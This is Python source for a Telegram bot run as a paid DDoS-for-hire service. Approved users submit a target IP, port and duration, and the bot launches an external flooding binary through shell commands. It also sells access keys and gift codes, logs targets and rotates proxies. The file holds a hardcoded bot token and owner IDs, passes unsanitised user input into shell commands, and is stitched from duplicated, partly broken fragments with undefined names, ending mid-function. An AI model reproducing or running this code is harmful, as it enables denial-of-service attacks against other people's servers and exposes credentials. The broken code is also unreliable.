import telebot
import subprocess
import requests
import datetime
import os
import logging
import random
import string

# Configure logging
logging.basicConfig(filename='bot.log', level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')


# Insert your Telegram bot token here
bot = telebot.TeleBot('7249644400:AAEZQiRq5FtL3E6DnRzKlFgdagqFvTxwKnI')

# Owner and admin user IDs
owner_id = "6077036964"
admin_ids = ["6077036964"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# File to store free user IDs and their credits
FREE_USER_FILE = "free_users.txt"

# Dictionary to store free user credits
free_user_credits = {}

# Dictionary to store cooldown time for each user's last attack
attack_cooldown = {}

# Dictionary to store gift codes with duration
gift_codes = {}

# Key prices for different durations
key_prices = {
    "day": 200,
    "week": 800,
    "month": 1200
}

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return [line.split()[0] for line in file.readlines()]
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass

# Read allowed user IDs and free user IDs
allowed_user_ids = read_users()
read_free_users()

# Function to log command to the file
def log_command(user_id, target, port, duration):
    user_info = bot.get_chat(user_id)
    username = "@" + user_info.username if user_info.username else f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {duration}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found ❌."
            else:
                file.truncate(0)
                response = "Logs cleared successfully ✅"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, duration=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if duration:
        log_entry += f" | Time: {duration}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

# Function to get current time
def get_current_time():
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

@bot.message_handler(commands=['tart'])
def send_welcome(message):
    response = (
        f"🌟 Welcome to the FAITH DDOS Bot! 🌟\n\n"
        f"Current Time: {get_current_time()}\n\n"
        "Here are some commands you can use:\n"
        "👤 /approveuser <id> <duration> - Approve a user for a certain duration (day, week, month)\n"
        "❌ /removeuser <id> - Remove a user\n"
        "🔑 /addadmin <id> <balance> - Add an admin with a starting balance\n"
        "🚫 /removeadmin <id> - Remove an admin\n"
        "💰 /checkbalance - Check your balance\n"
        "💥 /attack <host> <port> <time> - Simulate a DDoS attack\n"
        "💸 /setkeyprice <day/week/month> <price> - Set key price for different durations (Owner only)\n"
        "🎁 /creategift <duration> - Create a gift code for a specified duration (Admin only)\n"
        "🎁 /redeem <code> - Redeem a gift code\n\n"
        "Please use these commands responsibly. 😊"
    )
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['approveuser'])
def approve_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids or user_id == owner_id:
        command = message.text.split()
        if len(command) == 3:
            user_to_approve = command[1]
            duration = command[2]
            if duration not in key_prices:
                response = "Invalid duration. Use 'day', 'week', or 'month'."
                bot.send_message(message.chat.id, response)
                return

            expiration_date = datetime.datetime.now() + datetime.timedelta(days=1 if duration == "day" else 7 if duration == "week" else 30)
            allowed_user_ids.append(user_to_approve)
            with open(USER_FILE, "a") as file:
                file.write(f"{user_to_approve} {expiration_date}\n")
            
            response = f"User {user_to_approve} approved for {duration} 👍."
        else:
            response = "Usage: /approveuser <id> <duration>"
    else:
        response = "Only Admin or Owner Can Run This Command 😡."
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['removeuser'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids or user_id == owner_id:
        command = message.text.split()
        if len(command) == 2:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user in allowed_user_ids:
                        file.write(f"{user}\n")
                response = f"User {user_to_remove} removed successfully 👍."
            else:
                response = f"User {user_to_remove} not found in the list ❌."
        else:
            response = "Usage: /removeuser <id>"
    else:
        response = "Only Admin or Owner Can Run This Command 😡."
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['addadmin'])
def add_admin(message):
    user_id = str(message.chat.id)
    if user_id == owner_id:
        command = message.text.split()
        if len(command) == 3:
            admin_to_add = command[1]
            balance = int(command[2])
            admin_ids.append(admin_to_add)
            free_user_credits[admin_to_add] = balance
            response = f"Admin {admin_to_add} added with balance {balance} 👍."
        else:
            response = "Usage: /addadmin <id> <balance>"
    else:
        response = "Only the Owner Can Run This Command 😡."
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['removeadmin'])
def remove_admin(message):
    user_id = str(message.chat.id)
    if user_id == owner_id:
        command = message.text.split()
        if len(command) == 2:
            admin_to_remove = command[1]
            if admin_to_remove in admin_ids:
                admin_ids.remove(admin_to_remove)
                response = f"Admin {admin_to_remove} removed successfully 👍."
            else:
                response = f"Admin {admin_to_remove} not found in the list ❌."
        else:
            response = "Usage: /removeadmin <id>"
    else:
        response = "Only the Owner Can Run This Command 😡."
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['myinfo'])
def my_info(message):
    user = message.from_user
    is_approved = "✔️ Approved" if user.id in allowed_user_ids else "❌ N/A"

    user_info = (
        f"✨ ᕼᕮY {user.first_name}! HƐRƐ'S ƳOUR ƊƐƬAILS ⚓\n"
        f"👤 тԍ usᴇʀ ιᴅ : {user.id}\n"
        f"👍 тԍ usᴇʀɴᴀмᴇ : @{user.username if user.username else 'ɴoт sᴇт'}\n"
        f"🌍 ғιʀsт ɴᴀмᴇ : {user.first_name}\n"
        f"🆔 ʟᴀsт ɴᴀмᴇ : {user.last_name if user.last_name else 'ɴoт sᴇт'}\n"
        f"📅 נoιɴᴇᴅ ᴅᴀтᴇ : {message.date}\n"
        f"💌 cнᴀт ιᴅ : {message.chat.id}\n"
        f"✔️ ᴀᴘᴘʀovᴀʟ sтᴀтus : {is_approved}\n\n"
        f"κᴇᴇᴘ sнιɴιɴԍ ᴀɴᴅ нᴀvᴇ ᴀ woɴᴅᴇʀғuʟ ᴅᴀʏ! 🌈✨\n"
        f"ŦĦƗS ɃØŦ ØWNɆɌ :- @MR_ARMAN_OWNER"
    )
    
    bot.send_message(message.chat.id, user_info, parse_mode='Markdown')

# Global iterator for proxies
proxy_iterator = None
current_proxy = None

def get_proxies():
    global proxy_iterator
    try:
        response = requests.get(proxy_api_url)
        if response.status_code == 200:
            proxies = response.text.splitlines()
            if proxies:
                proxy_iterator = itertools.cycle(proxies)
                return proxy_iterator
    except Exception as e:
        print(f"Error fetching proxies: {str(e)}")
    return None

def get_next_proxy():
    global proxy_iterator
    if proxy_iterator is None:
        proxy_iterator = get_proxies()
    return next(proxy_iterator, None)

def rotate_proxy(sent_message):
    global current_proxy
    while sent_message.time_remaining > 0:
        new_proxy = get_next_proxy()
        if new_proxy:
            current_proxy = new_proxy
            bot.proxy = {
                'http': f'http://{new_proxy}',
                'https': f'https://{new_proxy}'
            }
            if sent_message.time_remaining > 0:
                new_text = (f"🚀⚡ ATTACK STARTED⚡🚀\n\n"
                            f"🎯 Target: {sent_message.target}\n"
                            f"🔌 Port: {sent_message.port}\n"
                            f"⏰ Time: {sent_message.time_remaining} Seconds\n"
                            f"🛡️ Proxy: {current_proxy}\n")
                try:
                    bot.edit_message_text(new_text, chat_id=sent_message.chat.id, message_id=sent_message.message_id)
                except telebot.apihelper.ApiException as e:
                    if "message is not modified" not in str(e):
                        print(f"Error updating message: {str(e)}")
        time.sleep(5)

# Ensure to add the rest of your code as needed


# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"🌠 STRATEGY DEPLOYED 🌠\n\n🚀 TARGET LOCKED [ ON YOUR SERVER ]... 💥\n⚔ BATTLE HAS COMMENCED ⚔\n\n🥷 ASSAULTING HOST ==) ( {target} )\n🥷 ENGAGED PORT ==) ( {port} )\n⏰ ATTACK DURATION -> ( {time} ) SECONDS 🔥\n\n💎 EXECUTED BY ARMAN TEAM ⚔\n\nnHOLD YOUR POSITION, NO ACTION NEEDED FOR {time} SECONDS\nTHANK YOU FOR UTILIZING AUR HAX 💫\n\nᴅᴇᴠᴇʟᴏᴘᴇʀ :--> @ᴍʀ_ᴀʀᴍᴀɴ_ᴏᴡɴᴇʀ"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =10
# SCRIPY BYE - @MR_ARMAN_OWNER 
# SCRIPY BYE - @MR_ARMAN_OWNER 
# SCRIPY BYE - @MR_ARMAN_OWNER 
# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                response = "⏳ 10-𝙨𝙚𝙘𝙤𝙣𝙙 𝙘𝙤𝙤𝙡𝙙𝙤𝙬𝙣 𝙞𝙨 𝙣𝙤𝙬 𝙖𝙥𝙥𝙡𝙞𝙚𝙙!\n🔄 𝙒𝙖𝙞𝙩 𝙖𝙣𝙙 𝙜𝙖𝙩𝙚 𝙩𝙝𝙚 𝙢𝙤𝙢𝙚𝙣𝙩\n⏳ 𝙀𝙣𝙟𝙤𝙮 𝙩𝙝𝙚 𝙚𝙣𝙙𝙡𝙚𝙫𝙤𝙧 𝙧𝙞𝙙𝙚!\n\nᴅᴇᴠᴇʟᴏᴘᴇʀ :--> @ᴍʀ_ᴀʀᴍᴀɴ_ᴏᴡɴᴇʀ"
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert port to integer
            time = int(command[3])  # Convert time to integer
            if time > 300:
                response = "⚠️ 𝙀𝙧𝙧𝙤𝙧: 𝙏𝙞𝙢𝙚 𝙞𝙣𝙩𝙚𝙧𝙫𝙖𝙡 𝙢𝙪𝙨𝙩 𝙗𝙚 𝙡𝙚𝙨𝙨 𝙩𝙝𝙖𝙣 300.\n🔍 𝘾𝙝𝙚𝙘𝙠 𝙮𝙤𝙪𝙧 𝙞𝙣𝙥𝙪𝙩 𝙖𝙣𝙙 𝙬𝙚𝙡𝙡 𝙖𝙙𝙟𝙪𝙨𝙩 𝙩𝙝𝙚 𝙝𝙖𝙣𝙙𝙡𝙚𝙙 𝙩𝙞𝙢𝙚.\n✔️ 𝘿𝙤𝙣'𝙩 𝙝𝙚𝙨𝙞𝙩𝙖𝙩𝙚 𝙩𝙤 𝙨𝙚𝙚 𝙚𝙓𝙥𝙚𝙧𝙩 𝙞𝙣𝙛𝙤 𝙛𝙤𝙧 𝙬𝙤𝙧𝙠𝙨𝙝𝙤𝙥𝙨.."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./JUPITER {target} {port} {time}"
                # Run the external command
                process = subprocess.run(full_command, shell=True)
                # Handle the response
                response = f"⚠️ 𝙏𝘼𝙍𝙂𝙀𝙏 𝘿𝙀𝙏𝘼𝙄𝙇𝙎 ⚠️\n\n✅ 𝘼𝙏𝙏𝘼𝘾𝙆 𝙁𝙄𝙉𝙄𝙎𝙃𝙀𝘿\n🔍 𝙏𝘼𝙍𝙂𝙀𝙏: {target}\n🔌 𝙋𝙊𝙍𝙏: {port}\n\n🕒 𝙏𝙄𝙈𝙀: {time}\n\n🔥 𝙇𝙚𝙩 𝙩𝙝𝙚 𝙘𝙝𝙖𝙤𝙨 𝙪𝙣𝙛𝙤𝙡𝙙. 𝙀𝙫𝙚𝙧𝙮 𝙘𝙡𝙤𝙪𝙙 𝙤𝙛 𝙙𝙚𝙨𝙤𝙡𝙖𝙩𝙞𝙤𝙣 𝙣𝙤𝙬 𝙙𝙖𝙧𝙠𝙚𝙣𝙨\n\n💥 𝙂𝙞𝙫𝙚 𝙣𝙤 𝙫𝙤𝙞𝙘𝙚 𝙩𝙤 𝙨𝙩𝙧𝙞𝙭 𝙛𝙤𝙧 𝙡𝙞𝙣𝙪𝙨! 🚨 𝘿𝙞𝙎𝘾𝙊𝙉𝙏𝙀𝙉𝙏 🏴‍☠️\n\n👁️ 𝙒𝘼𝙏𝘾𝙃 𝙤𝙪𝙩 𝙛𝙤𝙧 𝙧𝙚𝙩𝙡𝙖𝙩𝙞𝙤𝙣𝙨! 𝙏𝙝𝙚 𝙟𝙤𝙪𝙧𝙣𝙖𝙡 𝙤𝙛 𝙖𝙣𝙖𝙧𝙘𝙝𝙮 𝙝𝙖𝙨 𝙗𝙚𝙜𝙪𝙣."
                bot.send_message(message.chat.id, "SEND FEEDBACK 😡")
        else:
            response = "📝 DEAR USERS \n\n📜 USAGE DETAILS:\n/bgmi <IP> <PORT> <TIME>\n\n✨ EXAMPLE:\n- /bgmi 20.0.0.0 8700 120\n\n⚔️ LET'S THE WAR BEGIN!\n\n🔍 MORE INFORMATION:\n- <IP>: Target's IP address\n- <PORT>: Specific port for the attack\n- <TIME>: Duration of the attack in seconds\n\n❗️ USE RESPONSIBLY!\n\nᴛʜɪ𝙨 ʙᴏᴛ ᴏᴡɴᴇʀ ❤️‍🩹:--> @ᴍʀ_ᴀʀᴍᴀɴ_ᴏᴡɴᴇʀ"  # Updated command syntax
    else:
        response = ("🚫 UNAUTHORIZED ACCESS! 🚫\n\nNoops! It seems like you don't have permission to use the /attack command. To gain access and unleash the power of attacks, you can:\n\n🔑 VERIFY YOUR PERMISSIONS\n📝 REQUEST ACCESS FROM AN ADMIN\n\n📞 IF YOU STILL NEED HELP, CONTACT SUPPORT.ꜱ!\n\n𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 @MR_ARMAN_OWNER")
        bot.send_message(message.chat.id, "DM TO BUY ACCES :- @MR_ARMAN_OWNER ✅")
    bot.reply_to(message, response)


import telebot
import threading
import subprocess
import time

# List of allowed user IDs
allowed_user_ids = {-1002467968131, -1002467968131, 6077036964}  # Replace with actual user IDs


@bot.message_handler(commands=['start'])
def handle_start(message):
    if message.from_user.id not in allowed_user_ids:
        bot.send_message(message.chat.id, "🚫 You are not authorized to use this bot.")
        return

    markup = telebot.types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add(
        telebot.types.KeyboardButton("🔥 𝗔𝗧𝗧𝗔𝗖𝗞 ⚔️"),
        telebot.types.KeyboardButton("🛑 𝗦𝗧𝗢𝗣 🔴"),
        telebot.types.KeyboardButton("📞 𝗖𝗢𝗡𝗧𝗔𝗖𝗧 𝗔𝗗𝗠𝗜𝗡"),
        telebot.types.KeyboardButton("👤 𝗠𝗬 𝗔𝗖𝗖𝗢𝗨𝗡𝗧"),
    )
    bot.send_message(message.chat.id, "🌟 ᙎᙓᒪᙅOᙏᙓ TO Tᕼᙓ ᗩᖇᙏᗩᑎ Tᙓᗩᙏ ᗪᗪOS ᙖOT 🌟\n\n👑 AƊMIƝS ƇOMMAƝƊS 👑\n👤 /approveuser - <ιd> <dᥙrᥲtιon> - Aρρrovᥱ ᥲ ᥙsᥱr for ᥲ ᥴᥱrtᥲιn dᥙrᥲtιon (dᥲყ, ᥕᥱᥱk, month) (ONLY ADMINS) ✅\n❌ /removeuser - <𝐢𝐝> - 𝐑𝐞𝐦𝐨𝐯𝐞 𝐚 𝐮𝐬𝐞𝐫 𝐟𝐫𝐨𝐦 𝐭𝐡𝐞 𝐛𝐨𝐭'𝐬 𝐚𝐜𝐜𝐞𝐬𝐬 🚫 \n🔑 /addadmin - <𝐢𝐝> <𝐛𝐚𝐥𝐚𝐧𝐜𝐞> - 𝐀𝐝𝐝 𝐚𝐧 𝐚𝐝𝐦𝐢𝐧𝐢𝐬𝐭𝐫𝐚𝐭𝐨𝐫 𝐰𝐢𝐭𝐡 𝐚 𝐬𝐭𝐚𝐫𝐭𝐢𝐧𝐠 𝐛𝐚𝐥𝐚𝐧𝐜𝐞 𝐨𝐟 𝐲𝐨𝐮𝐫 𝐜𝐡𝐨𝐢𝐜𝐞 💰\n🚫 /removeadmin - <𝐢𝐝> - 𝐑𝐞𝐦𝐨𝐯𝐞 𝐚𝐧 𝐚𝐝𝐦𝐢𝐧 𝐟𝐫𝐨𝐦 𝐭𝐡𝐞 𝐥𝐢𝐬𝐭 ❌ \n\n💸 /setkeyprice - <𝐝𝐚𝐲/𝐰𝐞𝐞𝐤/𝐦𝐨𝐧𝐭𝐡> <𝐩𝐫𝐢𝐜𝐞> - 𝐒𝐞𝐭 𝐩𝐫𝐢𝐜𝐞𝐬 𝐟𝐨𝐫 𝐚𝐜𝐜𝐞𝐬𝐬 𝐤𝐞𝐲𝐬 𝐛𝐚𝐬𝐞𝐝 𝐨𝐧 𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧 (Owner only) 💵\n🎁 /creategift - <𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧> - 𝐂𝐫𝐞𝐚𝐭𝐞 𝐚 𝐠𝐢𝐟𝐭 𝐜𝐨𝐝𝐞 𝐟𝐨𝐫 𝐚 𝐬𝐩𝐞𝐜𝐢𝐟𝐢𝐞𝐝 𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧 (Admin only) 🎉\n\n👥 USERS COMMANDS 👥\n💰 /checkbalance - 𝑪𝒉𝒆𝒄𝒌 𝒚𝒐𝒖𝒓 𝒃𝒂𝒍𝒂𝒏𝒄𝒆 𝒂𝒏𝒅 𝒔𝒆𝒆 𝒉𝒐𝒘 𝒎𝒂𝒏𝒚 𝒓𝒆𝒔𝒐𝒖𝒓𝒄𝒆𝒔 𝒚𝒐𝒖 𝒉𝒂𝒗𝒆 📊\n💥 /attack - < 𝙄𝙋 > < 𝙋𝙊𝙍𝙏 > <TIME > 𝙏𝙊 𝙎𝙄𝙈𝙐𝙇𝘼𝙏𝙀 𝘼 𝘿𝘿𝙊𝙎 𝘼𝙏𝙏𝘼𝘾𝙆 (use responsibly! ⚠️)\n🛑 /stop - 𝐓𝐎 𝐒𝐓𝐎𝐏 𝐘𝐎𝐔𝐑 𝐀𝐓𝐓𝐀𝐂𝐊 ⏹️\n🎁 /redeem - <𝐜𝐨𝐝𝐞> - 𝐑𝐞𝐝𝐞𝐞𝐦 𝐚 𝐠𝐢𝐟𝐭 𝐜𝐨𝐝𝐞 𝐲𝐨𝐮'𝐯𝐞 𝐫𝐞𝐜𝐞𝐢𝐯𝐞𝐝 🎊\n\n🤖 𝗢𝘂𝗿 𝗯𝗼𝘁 𝗶𝘀 𝗵𝗲𝗿𝗲 𝘁𝗼 𝗮𝘀𝘀𝗶𝘀𝘁 𝘆𝗼𝘂, 𝗯𝘂𝘁 𝗽𝗹𝗲𝗮𝘀𝗲 𝘂𝘀𝗲 𝗿𝗲𝘀𝗽𝗼𝗻𝘀𝗶𝗯𝗹𝘆 𝗮𝗻𝗱 𝗲𝘁𝗵𝗶𝗰𝗮𝗹𝗹𝘆. 🛡️\n\n🚀 𝗦𝘁𝗮𝗿𝘁 𝘂𝘀𝗶𝗻𝗴 🙋‍♂️✨", reply_markup=markup)

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    if message.from_user.id not in allowed_user_ids:
        bot.send_message(message.chat.id, "🚫 You are not authorized to use this bot.")
        return

    if message.text == "🔥 𝗔𝗧𝗧𝗔𝗖𝗞 ⚔️":
        handle_attack_init(message)
    elif message.text == "🛑 𝗦𝗧𝗢𝗣 🔴":
        handle_stop(message)
    elif message.text == "📞 𝗖𝗢𝗡𝗧𝗔𝗖𝗧 𝗔𝗗𝗠𝗜𝗡":
        handle_contact_admin(message)
    elif message.text == "🔙 Back":
        handle_start(message)
    elif message.text == "❌ Delete Key":
        handle_delete_key_prompt(message)
    elif message.text == "🗑️ Delete All":
        handle_delete_all(message)

def handle_attack_init(message):
    bot.send_message(message.chat.id, "Enter the target IP, port, and time in the format: <IP> <port> <time>")
    bot.register_next_step_handler(message, process_attack)

def process_attack(message):
    try:
        command_parts = message.text.split()
        if len(command_parts) < 3:
            bot.reply_to(message, "Usage: <IP> <port> <time>")
            return

        username = message.from_user.username
        target = command_parts[0]
        port = command_parts[1]
        attack_time = int(command_parts[2])

        response = f"@{username}\n⚡ ATTACK STARTED ⚡\n\n🎯 Target: {target}\n🔌 Port: {port}\n⏰ Time: {attack_time} Seconds\n"
        sent_message = bot.reply_to(message, response)
        sent_message.target = target
        sent_message.port = port
        sent_message.time_remaining = attack_time

        # Start attack immediately in a separate thread
        attack_thread = threading.Thread(target=run_attack, args=(target, port, attack_time, sent_message))
        attack_thread.start()

        # Start updating remaining time in another thread
        time_thread = threading.Thread(target=update_remaining_time, args=(attack_time, sent_message))
        time_thread.start()

    except Exception as e:
        bot.reply_to(message, f"⚠️ An error occurred: {str(e)}")

def run_attack(target, port, attack_time, sent_message):
    try:
        full_command = f"./JUPITER {target} {port} {attack_time}"
        subprocess.run(full_command, shell=True)

        final_response = f"🚀⚡ ATTACK FINISHED⚡🚀"
        bot.edit_message_text(final_response, chat_id=sent_message.chat.id, message_id=sent_message.message_id)

    except Exception as e:
        bot.send_message(sent_message.chat.id, f"⚠️ An error occurred: {str(e)}")

def update_remaining_time(attack_time, sent_message):
    for remaining in range(attack_time, 0, -1):
        time.sleep(1)  # Sleep 1 second
        sent_message.time_remaining -= 1

        remaining_text = f"⏰ Time remaining: {sent_message.time_remaining} Seconds\n"
        updated_text = f"🚀⚡ ATTACK IN PROGRESS ⚡🚀\n\n🎯 Target: {sent_message.target}\n🔌 Port: {sent_message.port}\n" + remaining_text

        try:
            bot.edit_message_text(updated_text, chat_id=sent_message.chat.id, message_id=sent_message.message_id)
        except telebot.apihelper.ApiException as e:
            if "message is not modified" not in str(e):
                print(f"Error updating message: {str(e)}")

    # After countdown, mark the attack as finished
    sent_message.time_remaining = 0
    final_response = "🚀⚡ ATTACK FINISHED⚡🚀"
    try:
        bot.edit_message_text(final_response, chat_id=sent_message.chat.id, message_id=sent_message.message_id)
    except telebot.apihelper.ApiException as e:
        if "message is not modified" not in str(e):
            print(f"Error updating message: {str(e)}")

# Other necessary handler functions (handle_stop, handle_contact_admin, etc.) should be implemented similarly

def handle_stop(message):
    # Terminate the running attack process (assuming it's started with "bgmi")
    subprocess.run("pkill -f bgmi", shell=True)
    bot.reply_to(message, "🛑 Attack stopped.")

def handle_contact_admin(message):
    # Provide contact information of the admin
    ADMIN_ID = "83833838"  # Replace with the actual admin username or ID
    bot.reply_to(message, f"📞 Contact Admin: @MR_ARMAN_OWNER")


@bot.message_handler(commands=['creategift'])
def create_gift(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids:
        command = message.text.split()
        if len(command) == 2:
            duration = command[1]
            if duration in key_prices:
                amount = key_prices[duration]
                if user_id in free_user_credits and free_user_credits[user_id] >= amount:
                    code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
                    gift_codes[code] = duration
                    free_user_credits[user_id] -= amount
                    response = f"Gift code created: {code} for {duration} 🎁."
                else:
                    response = "You do not have enough credits to create a gift code."
            else:
                response = "Invalid duration. Use 'day', 'week', or 'month'."
        else:
            response = "Usage: /creategift <day/week/month>"
    else:
        response = "Only Admins Can Run This Command 😡."
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['redeem'])
def redeem_gift(message):
    user_id = str(message.chat.id)
    command = message.text.split()
    if len(command) == 2:
        code = command[1]
        if code in gift_codes:
            duration = gift_codes.pop(code)
            expiration_date = datetime.datetime.now() + datetime.timedelta(days=1 if duration == "day" else 7 if duration == "week" else 30)
            if user_id not in allowed_user_ids:
                allowed_user_ids.append(user_id)
            with open(USER_FILE, "a") as file:
                file.write(f"{user_id} {expiration_date}\n")
            response = f"Gift code redeemed: You have been granted access for {duration} 🎁."
        else:
            response = "Invalid or expired gift code ❌."
    else:
        response = "Usage: /redeem <code>"
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['checkbalance'])
def check_balance(message):
    user_id = str(message.chat.id)
    if user_id in free_user_credits:
        response = f"Your current balance is {free_user_credits[user_id]} credits."
    else:
        response = "You do not have a balance account ❌."
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['setkeyprice'])
def set_key_price(message):
    user_id = str(message.chat.id)
    if user_id == owner_id:
        command = message.text.split()
        if len(command) == 3:
            duration = command[1]
            price = int(command[2])
            if duration in key_prices:
                key_prices[duration] = price
                response = f"Key price for {duration} set to {price} credits 💸."
            else:
                response = "Invalid duration. Use 'day', 'week', or 'month'."
        else:
            response = "Usage: /setkeyprice <day/week/month> <price>"
    else:
        response = "Only the Owner Can Run This Command 😡."
    bot.send_message(message.chat.id, response)

# Function to handle the reply when free users run the /attack command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
            
    response = f"🚀Attack Sent Successfully! 🚀\n\n🗿𝐓𝐚𝐫𝐠𝐞𝐭: {target}:{port}\n🕦Attack Duration: {time}\n💣Method: Chin Tapak Dum Dum 🖤\n\n🔥Status: Attack in Progress... 🔥"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

# Handler for /attack command and direct attack input
@bot.message_handler(func=lambda message: message.text and (message.text.startswith('/attack') or not message.text.startswith('/')))
def handle_attack(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is not an admin or owner
        if user_id not in admin_ids and user_id != owner_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 0:
                response = "You Are On Cooldown ❌. Please Wait 0sec Before Running The /attack Command Again."
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        # Check if the message starts with '/attack' or not
        if len(command) == 4 or (not message.text.startswith('/') and len(command) == 3):
            # If it doesn't start with '/', assume it's an attack command and adjust the command list
            if not message.text.startswith('/'):
                command = ['/attack'] + command  # Prepend '/attack' to the command list
            target = command[1]
            port = int(command[2])
            time = int(command[3])
            if time > 300:
                response = "Error: Time interval must be less than 300."
            else:
                record_command_logs(user_id, target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)
                full_command = f"./attack {target} {port} {time} 300"
                subprocess.run(full_command, shell=True)
                response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
        else:
            response ="Please provide attack in the following format:\n\n<host> <port> <time>" 
    else:
        response = ("🚫 Unauthorized Access! 🚫\n\nOops! It seems like you don't have permission to use the /attack command. "
                    "To gain access and unleash the power of attacks, you can:\n\n👉 Contact an Admin or the Owner for approval.\n"
                    "🌟THE ONLY OWNER IS @FAKEYT70 DM TO BUY ACCESS")

    bot.reply_to(message, response)

# message_handler(func=lambda message: True)
def handle_unknown_command(message):
    response = (
        f"🌟 Welcome to the FAITH DDOS Bot! 🌟\n\n"
        f"Current Time: {get_current_time()}\n\n"
        "Here are some commands you can use:\n"
        "❌ /removeuser <id> - Remove a user\n"
        "🔑 /addadmin <id> <balance> - Add an admin with a starting balance\n"
        "🚫 /removeadmin <id> - Remove an admin\n"
        "💰 /checkbalance - Check your balance\n"
        "💥 /attack <host> <port> <time> - Simulate a DDoS attack\n"
        "💸 /setkeyprice <day/week/month> <price> - Set key price for different durations (Owner only)\n"
        "🎁 /creategift <duration> - Create a gift code for a specified duration (Admin only)\n"
        "🎁 /redeem <code> - Redeem a gift code\n"
        "🚨 /allusers  : Authorised Users Lists\n"
        "🛑 /clearusers  :- Clear The USERS File\n"
        " ⚠️ /rules  :- Please Check Before Use !!\n\n"
        "Please use these commands responsibly. 😊"
    )

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Please Follow These Rules ⚠️:

1. Dont Run Too Many Attacks !! Cause A Ban From Bot
2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot.
4. We Daily Checks The Logs So Follow these rules to avoid Ban!!'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids or owner_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found ❌"
        except FileNotFoundError:
            response = "No data found ❌"
    else:
        response = "Only Owner and Admin Can Run This Command 😡."
    bot.reply_to(message, response)

@bot.message_handler(commands=['clearusers'])
def clear_users_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids or owner_id:
        try:
            with open(USER_FILE, "r+") as file:
                log_content = file.read()
